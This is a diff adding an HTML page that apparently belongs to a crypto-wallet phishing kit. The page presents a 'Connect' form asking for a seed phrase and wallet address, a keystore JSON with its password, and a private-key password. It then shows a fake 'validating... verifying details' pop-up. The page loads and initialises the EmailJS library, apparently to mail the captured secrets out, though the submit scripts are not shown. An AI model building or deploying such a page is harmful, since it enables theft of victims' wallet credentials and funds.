@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/assets/style.css">
+    <title>Document</title>
+    <script type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+    (function(){
+      emailjs.init("eBmXmQWlxdPeGF6qE");
+    })();
+</script>
+</head>
+<body class="form">
+    <div class="cont">
+    <div class="label">
+      
+            <div class="item active-div" id="title_1">Phrase</div>
+     
+      
+            <div class="item" id="title_2">KeyStore</div>
+        
+        
+            <div class="item" id="title_3">Private Key</div>
+       
+    </div>
+    <div class="cont1 dis">
+        <h1>
+            seed phrase
+        </h1>
+        <p>
+            Typically 12 (sometimes 24) words separated by single spaces
+        </p>
+        <textarea class="text" id="input_1"></textarea>
+        <p>
+            Wallet address
+        </p>
+        <input type="text" class="add" id="input_2">
+        <section class="but">
+            <button class="bt">Cancle</button>
+            <button class="btn" onclick="submitOne()">Connect</button>
+        </section>
+    </div>
+
+
+
+
+
+
+    <div class="cont2">
+        <h1>
+            Keystore JSON
+        </h1>
+        <p>
+            Several lien of text in the from "{...}" plus the password used in encyption
+        </p>
+        <textarea type="text" id="input_3" ></textarea>
+        <p>
+            Password
+        </p>
+        <input type="text" class="add" id="input_4">
+        <section class="but">
+            <button class="bt">Cancle</button>
+            <button class="btn" onclick="submitTwo()">Connect</button>
+        </section>
+    </div>
+
+    <div class="cont3">
+        <p>
+            Password
+        </p>
+        <input type="text" class="add" id="input_5">
+        <section class="but">
+            <button class="bt">Cancle</button>
+            <button class="btn" onclick="submitThree()">Connect</button>
+        </section>
+    </div>
+    </div>
+    <section class="pop-up">
+        <div class="cover"></div>
+        <div class="info ">
+            <div class="loder">
+                
+            </div>
+            <h1>
+                validating...
+            </h1>
+            <p class="name">
+                verifying details 
+            </p>
+        </div>
+    </section>
+    <script src="/assets/app.js"></script>
+    <script src="/assets/form.js">
+    </script>
+</body>
+</html>
